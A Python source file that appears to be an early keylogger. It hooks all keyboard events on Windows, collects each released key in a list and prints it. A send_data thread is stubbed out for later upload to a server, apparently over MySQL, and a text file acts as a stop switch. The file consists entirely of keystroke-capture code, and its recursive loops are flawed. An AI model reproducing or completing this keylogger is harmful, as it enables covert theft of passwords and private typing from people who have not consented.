from threading import Thread, Lock, Condition
import sys
from win32api import LoadKeyboardLayout
import keyboard
import time
import pendulum
import pymysql


class App():
    def __init__(self):
        self.kill_send_info = False
        self.kill_keyboard = False

        self.th1 = Thread(target=self.start_keylogger)
        self.th2 = Thread(target=self.send_data)
        self.th3 = Thread(target=self.check_params)

        self.data = []


    def get_keyboard_pressed(self, e):
        if e.event_type == 'up':
            self.data.append(e.name)
            print(f'You pressed: {e.name}')
            print(f'\n\nYou list is: {self.data}')




    def start_keylogger(self):
        if self.kill_keyboard == False:
            keyboard.hook(self.get_keyboard_pressed)
            # keyboard.wait()
        else:
            print('EXITING')
            sys.exit()


    def send_data(self):
        if self.kill_send_info == False:
            # print(f'Saving data to server!')




            time.sleep(3)
            self.send_data()
        else:
            print('Sending data was STOPPED!')
            sys.exit()


    def check_params(self):
        try:
            with open('test.txt', 'r') as file:
                if file.read().lower() == 'stop':
                    self.kill_keyboard = True
                    self.kill_send_info = True
                    sys.exit()
                else:
                    date = pendulum.now()
                    # print(f'Flags are working [{date.hour}:{date.minute}:{date.second}]')
                    time.sleep(5)
                    self.check_params()
        except Exception as err:
            print(f'Error: \n{err}. \nWe will create file now.')
            with open('test.txt', 'w') as file:
                file.write('Working')
            self.check_params()




    def run(self):
        self.th1.start()  # start first Thread - start_keylogger
        self.th2.start()  # start second Thread - send_data
        self.th3.start()  # start third Thread - check_params





if __name__ == '__main__':
    LoadKeyboardLayout('00000409', 1)
    App().run()
